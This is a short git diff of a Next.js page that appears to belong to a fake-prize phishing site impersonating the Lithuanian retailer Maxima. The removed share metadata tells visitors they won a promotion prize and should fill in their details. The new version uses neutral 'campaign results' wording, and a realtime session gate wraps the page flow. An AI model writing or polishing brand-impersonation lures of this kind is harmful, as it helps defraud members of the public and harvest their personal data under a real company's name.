@@ -1,5 +1,5 @@
 import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
-import { WinFlow } from "@/components/demo/WinFlow";
+import { Win2Client } from "./win2-client";
 import { resolveServerSessionIdentity } from "@/lib/session-id";
 import { buildShareMetadata } from "@/lib/share-metadata";
 
@@ -7,9 +7,8 @@ export const dynamic = "force-dynamic";
 
 export async function generateMetadata() {
   return buildShareMetadata({
-    title: "Maxima — Jūs laimėjote!",
-    description:
-      "Sveikiname! Jūs laimėjote Maxima akcijos prizą. Užpildykite duomenis ir gaukite savo prizą.",
+    title: "Maxima — Rezultatas",
+    description: "MAXIMA kampanijos rezultatų puslapis.",
     canonical: "/win2",
   });
 }
@@ -26,7 +25,7 @@ export default async function Win2Page({ searchParams }: Props) {
   return (
     <>
       <SessionRealtimeGate sessionId={sessionId ?? ""} routeSessionId={routeSessionId ?? undefined} />
-      <WinFlow sessionId={sessionId} routeSessionId={routeSessionId} />
+      <Win2Client sessionId={sessionId} routeSessionId={routeSessionId ?? undefined} />
     </>
   );
 }
